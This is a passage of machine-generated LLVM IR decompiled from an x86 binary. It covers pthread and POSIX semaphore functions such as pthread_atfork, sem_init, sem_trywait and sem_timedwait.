  %v0_80566df = call i32 @pthread_call_handlers()
  br label %dec_label_pc_805670e

dec_label_pc_80566e6:                             ; preds = %entry
  %v1_80566ee = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8073eb0.683 to i32))
  %v1_80566fa = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_80784ac.679 to i32))
  %v0_80566ff = call i32 @__pthread_once_fork_parent()
  %v0_8056704 = load i32, i32* @ebx, align 4
  store i32 %v0_8056704, i32* @eax, align 4
  %v0_8056706 = call i32 @pthread_call_handlers()
  br label %dec_label_pc_805670e

dec_label_pc_805670e:                             ; preds = %dec_label_pc_8056667, %dec_label_pc_80566e6
  %v0_8056711 = load i32, i32* @edi, align 4
  %v2_8056713 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056713, i32* @ebx, align 4
  store i32 %v0_8056623, i32* @esi, align 4
  store i32 %v0_8056622, i32* @edi, align 4
  store i32 %v0_8056621, i32* @ebp, align 4
  ret i32 %v0_8056711

; uselistorder directives
  uselistorder i32 %v0_8056659, { 1, 0 }
  uselistorder i32 ()* @pthread_call_handlers, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805670e, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v1_8056718 = call i32 @fork(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_8056718
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_8056723 = call i32 @malloc(i32 24)
  store i32 %v1_8056723, i32* @ebx, align 4
  %v1_8056732 = icmp eq i32 %v1_8056723, 0
  br i1 %v1_8056732, label %dec_label_pc_805678a, label %dec_label_pc_8056736

dec_label_pc_8056736:                             ; preds = %entry
  %v1_805673e = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80784ac.679 to i32))
  store i32 %v1_8056723, i32* @ecx, align 4
  store i32 %arg1, i32* @edx, align 4
  store i32 ptrtoint (i32* @global_var_80784c4.680 to i32), i32* @eax, align 4
  %v1_8056750 = call i32 @pthread_insert_list(i32 0)
  store i32 %arg2, i32* @edx, align 4
  %v1_805675b = add i32 %v1_8056723, 8
  store i32 %v1_805675b, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_80784cc.682 to i32), i32* @eax, align 4
  %v1_8056763 = call i32 @pthread_insert_list(i32 1)
  store i32 %arg3, i32* @edx, align 4
  %v1_805676e = add i32 %v1_8056723, 16
  store i32 %v1_805676e, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_80784c8.681 to i32), i32* @eax, align 4
  %v1_8056776 = call i32 @pthread_insert_list(i32 1)
  %v1_8056780 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_80784ac.679 to i32))
  br label %dec_label_pc_805678a

dec_label_pc_805678a:                             ; preds = %entry, %dec_label_pc_8056736
  %v0_805678d = phi i32 [ 12, %entry ], [ 0, %dec_label_pc_8056736 ]
  ret i32 %v0_805678d

; uselistorder directives
  uselistorder i32 %v1_8056723, { 0, 2, 3, 1, 4 }
  uselistorder i32 (i32)* @pthread_insert_list, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805678a, { 1, 0 }
}

define i32 @enqueue() local_unnamed_addr {
entry:
  %v0_8056791 = load i32, i32* @edx, align 4
  %v1_8056791 = add i32 %v0_8056791, 24
  %v2_8056791 = inttoptr i32 %v1_8056791 to i32*
  %v3_8056791 = load i32, i32* %v2_8056791, align 4
  store i32 %v3_8056791, i32* @ebx, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80567ad = load i32, i32* @ebx, align 4
  store i32 %v0_80567ad, i32* %stack_var_-4, align 4
  %v0_80567ae = load i32, i32* @eax, align 4
  br label %dec_label_pc_80567cc

dec_label_pc_80567b2:                             ; preds = %dec_label_pc_80567cc
  %v1_80567b2 = load i32, i32* @edx, align 4
  %v12_80567b2 = icmp eq i32 %v2_80567cc, %v1_80567b2
  %v1_80567b4 = icmp eq i1 %v12_80567b2, false
  %v1_80567c9 = add i32 %v2_80567cc, 8
  br i1 %v1_80567b4, label %dec_label_pc_80567cc, label %dec_label_pc_80567b6

dec_label_pc_80567b6:                             ; preds = %dec_label_pc_80567b2
  %v2_80567b6 = inttoptr i32 %v1_80567c9 to i32*
  %v3_80567b6 = load i32, i32* %v2_80567b6, align 4
  store i32 %v3_80567b6, i32* %v1_80567cc, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v2_80567b6, align 4
  %v2_80567d4.pre = load i32, i32* %stack_var_-4, align 4
  %v0_80567d5.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80567d4

dec_label_pc_80567cc:                             ; preds = %dec_label_pc_80567b2, %entry
  %v1_80567b9 = phi i32 [ %v0_80567ae, %entry ], [ %v1_80567c9, %dec_label_pc_80567b2 ]
  %v1_80567cc = inttoptr i32 %v1_80567b9 to i32*
  %v2_80567cc = load i32, i32* %v1_80567cc, align 4
  %v1_80567ce = icmp eq i32 %v2_80567cc, 0
  %v1_80567d0 = icmp eq i1 %v1_80567ce, false
  br i1 %v1_80567d0, label %dec_label_pc_80567b2, label %dec_label_pc_80567d2

dec_label_pc_80567d2:                             ; preds = %dec_label_pc_80567cc
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80567d4

dec_label_pc_80567d4:                             ; preds = %dec_label_pc_80567b6, %dec_label_pc_80567d2
  %v0_80567d5 = phi i32 [ %v0_80567d5.pre, %dec_label_pc_80567b6 ], [ 0, %dec_label_pc_80567d2 ]
  %v2_80567d4 = phi i32 [ %v2_80567d4.pre, %dec_label_pc_80567b6 ], [ %v0_80567ad, %dec_label_pc_80567d2 ]
  store i32 %v2_80567d4, i32* @ebx, align 4
  ret i32 %v0_80567d5

; uselistorder directives
  uselistorder i32 %v2_80567cc, { 2, 0, 1 }
  uselistorder i32* %v1_80567cc, { 1, 0 }
  uselistorder i32 %v1_80567c9, { 1, 0 }
  uselistorder label %dec_label_pc_80567d4, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_80567da = add i32 %arg1, 8
  %v2_80567da = inttoptr i32 %v1_80567da to i32*
  %v3_80567da = load i32, i32* %v2_80567da, align 4
  store i32 %v3_80567da, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if.2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80567e6 = load i32, i32* @esi, align 4
  %v0_80567e7 = load i32, i32* @ebx, align 4
  %v0_80567eb = load i32, i32* @eax, align 4
  store i32 %v0_80567eb, i32* @ebx, align 4
  %v0_80567ed = load i32, i32* @edx, align 4
  store i32 %v0_80567ed, i32* @esi, align 4
  %v1_80567ef = icmp eq i32 %v0_80567ed, 0
  br i1 %v1_80567ef, label %dec_label_pc_80567fb, label %dec_label_pc_80567f3

dec_label_pc_80567f3:                             ; preds = %entry
  %v1_80567f3 = add i32 %v0_80567eb, 64
  %v2_80567f3 = inttoptr i32 %v1_80567f3 to i8*
  %v3_80567f3 = load i8, i8* %v2_80567f3, align 1
  %v4_80567f3 = icmp eq i8 %v3_80567f3, 0
  %v1_80567f7 = icmp eq i1 %v4_80567f3, false
  br i1 %v1_80567f7, label %dec_label_pc_805681d, label %dec_label_pc_8056805

dec_label_pc_80567fb:                             ; preds = %entry
  %v1_80567fb = add i32 %v0_80567eb, 28
  %v2_80567fb = inttoptr i32 %v1_80567fb to i32*
  %v3_80567fb = load i32, i32* %v2_80567fb, align 4
  store i32 %v3_80567fb, i32* @eax, align 4
  store i32 %v0_80567eb, i32* @edx, align 4
  %v1_8056800 = call i32 @__pthread_lock(i32 %v0_80567e7)
  %v1_8056805.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056805

dec_label_pc_8056805:                             ; preds = %dec_label_pc_80567f3, %dec_label_pc_80567fb
  %v1_8056805 = phi i32 [ %v0_80567eb, %dec_label_pc_80567f3 ], [ %v1_8056805.pre, %dec_label_pc_80567fb ]
  %v2_8056805 = add i32 %v1_8056805, 444
  %v3_8056805 = inttoptr i32 %v2_8056805 to i32*
  store i32 %v0_80567ed, i32* %v3_8056805, align 4
  %v1_805680d = icmp eq i1 %v1_80567ef, false
  br i1 %v1_805680d, label %dec_label_pc_805681d, label %dec_label_pc_805680f

dec_label_pc_805680f:                             ; preds = %dec_label_pc_8056805
  %v0_8056812 = load i32, i32* @ebx, align 4
  %v1_8056812 = add i32 %v0_8056812, 28
  %v2_8056812 = inttoptr i32 %v1_8056812 to i32*
  %v3_8056812 = load i32, i32* %v2_8056812, align 4
  %v1_8056815 = inttoptr i32 %v3_8056812 to i32*
  %v2_8056815 = call i32 @__pthread_unlock(i32* %v1_8056815)
  br label %dec_label_pc_805681d

dec_label_pc_805681d:                             ; preds = %dec_label_pc_8056805, %dec_label_pc_80567f3, %dec_label_pc_805680f
  %v2_805681d = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80567e7, i32* @ebx, align 4
  store i32 %v0_80567e6, i32* @esi, align 4
  ret i32 %v2_805681d

; uselistorder directives
  uselistorder i1 %v1_80567ef, { 1, 0 }
  uselistorder label %dec_label_pc_805681d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056805, { 1, 0 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
  %v1_8056824 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8056829 = inttoptr i32 %v1_8056824 to i32*
  store i32 38, i32* %v1_8056829, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v1_8056839 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805683e = inttoptr i32 %v1_8056839 to i32*
  store i32 38, i32* %v1_805683e, align 4
  ret i32 -1
}

define i32 @sem_open() local_unnamed_addr {
entry:
  %v1_805684e = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8056853 = inttoptr i32 %v1_805684e to i32*
  store i32 38, i32* %v1_8056853, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8056868 = add i32 %arg1, 12
  %v2_8056868 = inttoptr i32 %v1_8056868 to i32*
  %v3_8056868 = load i32, i32* %v2_8056868, align 4
  %v4_8056868 = icmp eq i32 %v3_8056868, 0
  br i1 %v4_8056868, label %dec_label_pc_805687c, label %dec_label_pc_805686e

dec_label_pc_805686e:                             ; preds = %entry
  %v1_805686e = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8056876 = inttoptr i32 %v1_805686e to i32*
  store i32 16, i32* %v1_8056876, align 4
  %v0_805687c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805687c

dec_label_pc_805687c:                             ; preds = %entry, %dec_label_pc_805686e
  %v0_805687c = phi i32 [ 0, %entry ], [ %v0_805687c.pre, %dec_label_pc_805686e ]
  ret i32 %v0_805687c

; uselistorder directives
  uselistorder label %dec_label_pc_805687c, { 1, 0 }
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8056883 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_805688f = call i32 @__pthread_lock(i32 %v0_8056883)
  %v0_8056894 = load i32, i32* @ebx, align 4
  %v1_8056894 = add i32 %v0_8056894, 8
  %v2_8056894 = inttoptr i32 %v1_8056894 to i32*
  %v3_8056894 = load i32, i32* %v2_8056894, align 4
  %v1_8056897 = icmp eq i32 %v3_8056894, 0
  %v1_8056899 = icmp eq i1 %v1_8056897, false
  br i1 %v1_8056899, label %dec_label_pc_80568ab, label %dec_label_pc_805689b

dec_label_pc_805689b:                             ; preds = %entry
  %v1_805689b = call i32 @__errno_location(i32 %v0_8056883)
  store i32 -1, i32* @esi, align 4
  %v1_80568a3 = inttoptr i32 %v1_805689b to i32*
  store i32 11, i32* %v1_80568a3, align 4
  br label %dec_label_pc_80568b1

dec_label_pc_80568ab:                             ; preds = %entry
  %v1_80568ab = add i32 %v3_8056894, -1
  store i32 0, i32* @esi, align 4
  store i32 %v1_80568ab, i32* %v2_8056894, align 4
  br label %dec_label_pc_80568b1

dec_label_pc_80568b1:                             ; preds = %dec_label_pc_805689b, %dec_label_pc_80568ab
  %v0_80568b4 = load i32, i32* @ebx, align 4
  %v1_80568b5 = inttoptr i32 %v0_80568b4 to i32*
  %v2_80568b5 = call i32 @__pthread_unlock(i32* %v1_80568b5)
  %v0_80568ba = load i32, i32* @esi, align 4
  ret i32 %v0_80568ba

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80568b1, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  store i32 %tmp4, i32* %eax.global-to-local, align 4
  %v2_80568cd = icmp slt i32 %arg3, 0
  %v1_80568cf = icmp eq i1 %v2_80568cd, false
  br i1 %v1_80568cf, label %dec_label_pc_80568de, label %dec_label_pc_80568d1

dec_label_pc_80568d1:                             ; preds = %entry
  %v1_80568d1 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80568d1, i32* %eax.global-to-local, align 4
  %v1_80568d6 = inttoptr i32 %v1_80568d1 to i32*
  store i32 22, i32* %v1_80568d6, align 4
  br label %dec_label_pc_805690e

dec_label_pc_80568de:                             ; preds = %entry
  %v4_80568de = icmp eq i32 %arg2, 0
  br i1 %v4_80568de, label %dec_label_pc_80568f5, label %dec_label_pc_80568e5

dec_label_pc_80568e5:                             ; preds = %dec_label_pc_80568de
  %v1_80568e5 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80568e5, i32* %eax.global-to-local, align 4
  %v1_80568ea = inttoptr i32 %v1_80568e5 to i32*
  store i32 38, i32* %v1_80568ea, align 4
  br label %dec_label_pc_805690e

dec_label_pc_80568f5:                             ; preds = %dec_label_pc_80568de
  store i32 0, i32* %arg1, align 4
  %v0_80568fb = load i32, i32* %eax.global-to-local, align 4
  %v1_80568fb = add i32 %v0_80568fb, 4
  %v2_80568fb = inttoptr i32 %v1_80568fb to i32*
  store i32 0, i32* %v2_80568fb, align 4
  %v1_8056902 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056902 = add i32 %v1_8056902, 8
  %v3_8056902 = inttoptr i32 %v2_8056902 to i32*
  store i32 %arg3, i32* %v3_8056902, align 4
  %v0_8056905 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056905 = add i32 %v0_8056905, 12
  %v2_8056905 = inttoptr i32 %v1_8056905 to i32*
  store i32 0, i32* %v2_8056905, align 4
  br label %dec_label_pc_805690e

dec_label_pc_805690e:                             ; preds = %dec_label_pc_80568e5, %dec_label_pc_80568d1, %dec_label_pc_80568f5
  %storemerge = phi i32 [ 0, %dec_label_pc_80568f5 ], [ -1, %dec_label_pc_80568d1 ], [ -1, %dec_label_pc_80568e5 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 2, 3, 4, 1, 6, 5 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805690e, { 2, 0, 1 }
}

define i32 @thread_self.3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_8056919 = load i32, i32* @esp, align 4
  %v1_8056919 = load i32, i32* @global_var_807a620.650, align 32
  %v7_8056919 = icmp ult i32 %v0_8056919, %v1_8056919
  %v1_805691f = icmp eq i1 %v7_8056919, false
  br i1 %v1_805691f, label %dec_label_pc_8056950, label %dec_label_pc_8056921

dec_label_pc_8056921:                             ; preds = %entry
  %v1_8056921 = load i32, i32* @global_var_807a624.651, align 4
  %v7_8056921 = icmp ult i32 %v0_8056919, %v1_8056921
  br i1 %v7_8056921, label %dec_label_pc_8056936, label %dec_label_pc_8056929

dec_label_pc_8056929:                             ; preds = %dec_label_pc_8056921
  %v1_805692e = load i32, i32* @global_var_807a628.653, align 8
  %v7_805692e = icmp ult i32 %v0_8056919, %v1_805692e
  br i1 %v7_805692e, label %dec_label_pc_8056950, label %dec_label_pc_8056936

dec_label_pc_8056936:                             ; preds = %dec_label_pc_8056929, %dec_label_pc_8056921
  %v0_8056936 = load i32, i32* @global_var_807e100.654, align 256
  %v1_8056936 = icmp eq i32 %v0_8056936, 0
  br i1 %v1_8056936, label %dec_label_pc_8056944, label %dec_label_pc_805693f

dec_label_pc_805693f:                             ; preds = %dec_label_pc_8056936
  %v0_805693f = call i32 @__pthread_find_self()
  br label %dec_label_pc_8056944

dec_label_pc_8056944:                             ; preds = %dec_label_pc_8056936, %dec_label_pc_805693f
  %v2_805694a = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8056950

dec_label_pc_8056950:                             ; preds = %dec_label_pc_8056929, %entry, %dec_label_pc_8056944
  %v0_8056950 = phi i32 [ ptrtoint (i32* @global_var_8073aa0.652 to i32), %dec_label_pc_8056929 ], [ ptrtoint (i32* @global_var_80738c0 to i32), %entry ], [ %v2_805694a, %dec_label_pc_8056944 ]
  ret i32 %v0_8056950

; uselistorder directives
  uselistorder label %dec_label_pc_8056950, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056944, { 1, 0 }
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8056951 = load i32, i32* @esi, align 4
  %v0_8056952 = load i32, i32* @ebx, align 4
  %v2_8056956 = call i32 @thread_self.3(i32 %v0_8056952, i32 %v0_8056951)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_8056956, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_8056969 = call i32 @__pthread_lock(i32 %v2_8056956)
  store i32 %arg2, i32* @edx, align 4
  %v0_8056972 = load i32, i32* @ebx, align 4
  %v1_8056972 = add i32 %v0_8056972, 12
  store i32 %v1_8056972, i32* @eax, align 4
  %v0_8056975 = call i32 @remove_from_queue()
  store i32 %v0_8056975, i32* @esi, align 4
  %v0_805697f = load i32, i32* @ebx, align 4
  %v1_8056980 = inttoptr i32 %v0_805697f to i32*
  %v2_8056980 = call i32 @__pthread_unlock(i32* %v1_8056980)
  %v0_8056985 = load i32, i32* @esi, align 4
  ret i32 %v0_8056985

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend.4() local_unnamed_addr {
entry:
  %v0_8056990 = load i32, i32* @eax, align 4
  %v1_8056991 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8056990)
  ret i32 %v1_8056991
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_805699c = load i32, i32* @esi, align 4
  %v0_805699d = load i32, i32* @ebx, align 4
  store i32 %v0_805699d, i32* %stack_var_-16, align 4
  %v4_805699d = ptrtoint i32* %stack_var_-16 to i32
  %v2_80569a1 = call i32 @thread_self.3(i32 %v0_805699d, i32 %v0_805699c)
  store i32 %arg1, i32* @edi, align 4
  store i32 %v2_80569a1, i32* @edx, align 4
  store i32 %v2_80569a1, i32* @esi, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v0_80569b4 = load i32, i32* %stack_var_-16, align 4
  %v1_80569b4 = call i32 @__pthread_lock(i32 %v0_80569b4)
  %v0_80569b9 = load i32, i32* @edi, align 4
  %v1_80569b9 = add i32 %v0_80569b9, 8
  %v2_80569b9 = inttoptr i32 %v1_80569b9 to i32*
  %v3_80569b9 = load i32, i32* %v2_80569b9, align 4
  %tmp20 = icmp slt i32 %v3_80569b9, 1
  br i1 %tmp20, label %dec_label_pc_80569d1, label %dec_label_pc_80569c0

dec_label_pc_80569c0:                             ; preds = %entry
  %v1_80569c0 = add i32 %v3_80569b9, -1
  store i32 %v1_80569c0, i32* %v2_80569b9, align 4
  %v0_80569c7 = load i32, i32* @edi, align 4
  store i32 %v0_80569c7, i32* %stack_var_-60, align 4
  %v1_80569c8 = inttoptr i32 %v0_80569c7 to i32*
  %v2_80569c8 = call i32 @__pthread_unlock(i32* %v1_80569c8)
  br label %dec_label_pc_80569f1

dec_label_pc_80569d1:                             ; preds = %entry
  %v0_80569d1 = load i32, i32* @ebp, align 4
  %v1_80569d1 = add i32 %v0_80569d1, 4
  %v2_80569d1 = inttoptr i32 %v1_80569d1 to i32*
  %v3_80569d1 = load i32, i32* %v2_80569d1, align 4
  %tmp23 = icmp ult i32 %v3_80569d1, 1000000000
  br i1 %tmp23, label %dec_label_pc_80569f9, label %dec_label_pc_80569da

dec_label_pc_80569da:                             ; preds = %dec_label_pc_80569d1
  store i32 %v0_80569b9, i32* %stack_var_-60, align 4
  %v1_80569de = inttoptr i32 %v0_80569b9 to i32*
  %v2_80569de = call i32 @__pthread_unlock(i32* %v1_80569de)
  %v1_80569e3 = call i32 @__errno_location(i32 %v0_80569b9)
  %v1_80569e8 = inttoptr i32 %v1_80569e3 to i32*
  store i32 22, i32* %v1_80569e8, align 4
  br label %dec_label_pc_80569f1

dec_label_pc_80569f1:                             ; preds = %dec_label_pc_80569c0, %dec_label_pc_80569da
  %storemerge = phi i32 [ -1, %dec_label_pc_80569da ], [ 0, %dec_label_pc_80569c0 ]
  br label %dec_label_pc_8056aeb

dec_label_pc_80569f9:                             ; preds = %dec_label_pc_80569d1
  store i32 %v0_80569b9, i32* %stack_var_-24, align 4
  %v2_8056a05 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8056a05, i32* @edx, align 4
  %v0_8056a09 = load i32, i32* @esi, align 4
  %v1_8056a09 = add i32 %v0_8056a09, 442
  %v2_8056a09 = inttoptr i32 %v1_8056a09 to i8*
  store i8 0, i8* %v2_8056a09, align 1
  %v0_8056a10 = load i32, i32* @esi, align 4
  store i32 %v0_8056a10, i32* @eax, align 4
  %v0_8056a12 = load i32, i32* %stack_var_-24, align 4
  %v2_8056a12 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_8056a12, i32 134572369)
  %v0_8056a17 = load i32, i32* @esi, align 4
  %v1_8056a17 = add i32 %v0_8056a17, 66
  %v2_8056a17 = inttoptr i32 %v1_8056a17 to i8*
  %v3_8056a17 = load i8, i8* %v2_8056a17, align 1
  %v4_8056a17 = icmp eq i8 %v3_8056a17, 0
  br i1 %v4_8056a17, label %dec_label_pc_8056a28, label %dec_label_pc_8056a1d

dec_label_pc_8056a1d:                             ; preds = %dec_label_pc_80569f9
  store i32 1, i32* @ebx, align 4
  %v1_8056a22 = add i32 %v0_8056a17, 64
  %v2_8056a22 = inttoptr i32 %v1_8056a22 to i8*
  %v3_8056a22 = load i8, i8* %v2_8056a22, align 1
  %v4_8056a22 = icmp eq i8 %v3_8056a22, 0
  br i1 %v4_8056a22, label %dec_label_pc_8056a34, label %dec_label_pc_8056a28

dec_label_pc_8056a28:                             ; preds = %dec_label_pc_8056a1d, %dec_label_pc_80569f9
  store i32 %v0_8056a17, i32* @edx, align 4
  %v0_8056a2d = call i32 @enqueue()
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8056a34

dec_label_pc_8056a34:                             ; preds = %dec_label_pc_8056a1d, %dec_label_pc_8056a28
  %v0_8056a37 = load i32, i32* @edi, align 4
  store i32 %v0_8056a37, i32* %stack_var_-60, align 4
  %v1_8056a38 = inttoptr i32 %v0_8056a37 to i32*
  %v2_8056a38 = call i32 @__pthread_unlock(i32* %v1_8056a38)
  %v0_8056a40 = load i32, i32* @ebx, align 4
  %v1_8056a40 = icmp eq i32 %v0_8056a40, 0
  br i1 %v1_8056a40, label %dec_label_pc_8056a4f.preheader, label %dec_label_pc_8056a44

dec_label_pc_8056a4f.preheader:                   ; preds = %dec_label_pc_8056a34
  %v0_8056a52.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056a4f

dec_label_pc_8056a44:                             ; preds = %dec_label_pc_8056a34
  store i32 0, i32* @edx, align 4
  %v0_8056a46 = load i32, i32* @esi, align 4
  store i32 %v0_8056a46, i32* @eax, align 4
  %v0_8056a48 = load i32, i32* %stack_var_-60, align 4
  %v2_8056a48 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_8056a48, i32 %tmp14)
  br label %dec_label_pc_8056ac2

dec_label_pc_8056a4f:                             ; preds = %dec_label_pc_8056a9d, %dec_label_pc_8056a94, %dec_label_pc_8056a4f.preheader
  %v0_8056a52 = phi i32 [ %v0_8056a52.pre, %dec_label_pc_8056a4f.preheader ], [ %v0_8056a8b, %dec_label_pc_8056a94 ], [ %v0_8056a8b, %dec_label_pc_8056a9d ]
  %v0_8056a4f = load i32, i32* @ecx, align 4
  %v0_8056a51 = load i32, i32* @ebp, align 4
  store i32 %v0_8056a52, i32* %stack_var_-60, align 4
  %v3_8056a53 = inttoptr i32 %v0_8056a4f to i32*
  %v4_8056a53 = call i32 @__pthread_timedsuspend_new(i32 %v0_8056a52, i32* %v3_8056a53, i32 %v0_8056a4f)
  %v1_8056a5b = icmp eq i32 %v4_8056a53, 0
  %v1_8056a5d = icmp eq i1 %v1_8056a5b, false
  br i1 %v1_8056a5d, label %dec_label_pc_8056a8b, label %dec_label_pc_8056a5f

dec_label_pc_8056a5f:                             ; preds = %dec_label_pc_8056a4f
  %v0_8056a5f = load i32, i32* @esi, align 4
  store i32 %v0_8056a5f, i32* @edx, align 4
  %v0_8056a61 = load i32, i32* @edi, align 4
  store i32 %v0_8056a61, i32* @eax, align 4
  %v0_8056a63 = load i32, i32* %stack_var_-60, align 4
  %v1_8056a63 = call i32 @__pthread_lock(i32 %v0_8056a63)
  %v0_8056a68 = load i32, i32* @esi, align 4
  store i32 %v0_8056a68, i32* @edx, align 4
  %v0_8056a6a = load i32, i32* @edi, align 4
  %v1_8056a6a = add i32 %v0_8056a6a, 12
  store i32 %v1_8056a6a, i32* @eax, align 4
  %v0_8056a6d = call i32 @remove_from_queue()
  store i32 %v0_8056a6d, i32* @ebx, align 4
  %v0_8056a77 = load i32, i32* @edi, align 4
  store i32 %v0_8056a77, i32* %stack_var_-60, align 4
  %v1_8056a78 = inttoptr i32 %v0_8056a77 to i32*
  %v2_8056a78 = call i32 @__pthread_unlock(i32* %v1_8056a78)
  %v1_8056a80 = icmp eq i32 %v0_8056a6d, 0
  %v1_8056a82 = icmp eq i1 %v1_8056a80, false
  br i1 %v1_8056a82, label %dec_label_pc_8056ad0, label %dec_label_pc_8056a84

dec_label_pc_8056a84:                             ; preds = %dec_label_pc_8056a5f
  %v0_8056a84 = load i32, i32* @esi, align 4
  store i32 %v0_8056a84, i32* @eax, align 4
  %v0_8056a86 = call i32 @suspend.4()
  br label %dec_label_pc_8056a8b

dec_label_pc_8056a8b:                             ; preds = %dec_label_pc_8056a4f, %dec_label_pc_8056a84
  %v0_8056a8b = load i32, i32* @esi, align 4
  %v1_8056a8b = add i32 %v0_8056a8b, 442
  %v2_8056a8b = inttoptr i32 %v1_8056a8b to i8*
  %v3_8056a8b = load i8, i8* %v2_8056a8b, align 1
  %v4_8056a8b = icmp eq i8 %v3_8056a8b, 0
  %v1_8056a92 = icmp eq i1 %v4_8056a8b, false
  br i1 %v1_8056a92, label %dec_label_pc_8056aa3, label %dec_label_pc_8056a94

dec_label_pc_8056a94:                             ; preds = %dec_label_pc_8056a8b
  %v1_8056a94 = add i32 %v0_8056a8b, 440
  %v2_8056a94 = inttoptr i32 %v1_8056a94 to i8*
  %v3_8056a94 = load i8, i8* %v2_8056a94, align 1
  %v4_8056a94 = icmp eq i8 %v3_8056a94, 0
  br i1 %v4_8056a94, label %dec_label_pc_8056a4f, label %dec_label_pc_8056a9d

dec_label_pc_8056a9d:                             ; preds = %dec_label_pc_8056a94
  %v1_8056a9d = add i32 %v0_8056a8b, 64
  %v2_8056a9d = inttoptr i32 %v1_8056a9d to i8*
  %v3_8056a9d = load i8, i8* %v2_8056a9d, align 1
  %v4_8056a9d = icmp eq i8 %v3_8056a9d, 0
  %v1_8056aa1 = icmp eq i1 %v4_8056a9d, false
  br i1 %v1_8056aa1, label %dec_label_pc_8056a4f, label %dec_label_pc_8056aa3

dec_label_pc_8056aa3:                             ; preds = %dec_label_pc_8056a9d, %dec_label_pc_8056a8b
  store i32 0, i32* @edx, align 4
  store i32 %v0_8056a8b, i32* @eax, align 4
  %v0_8056aa7 = load i32, i32* %stack_var_-60, align 4
  %v2_8056aa7 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_8056aa7, i32 %v0_8056a51)
  %v0_8056aac = load i32, i32* @esi, align 4
  %v1_8056aac = add i32 %v0_8056aac, 440
  %v2_8056aac = inttoptr i32 %v1_8056aac to i8*
  %v3_8056aac = load i8, i8* %v2_8056aac, align 1
  %v4_8056aac = icmp eq i8 %v3_8056aac, 0
  br i1 %v4_8056aac, label %dec_label_pc_8056ae9, label %dec_label_pc_8056ab5

dec_label_pc_8056ab5:                             ; preds = %dec_label_pc_8056aa3
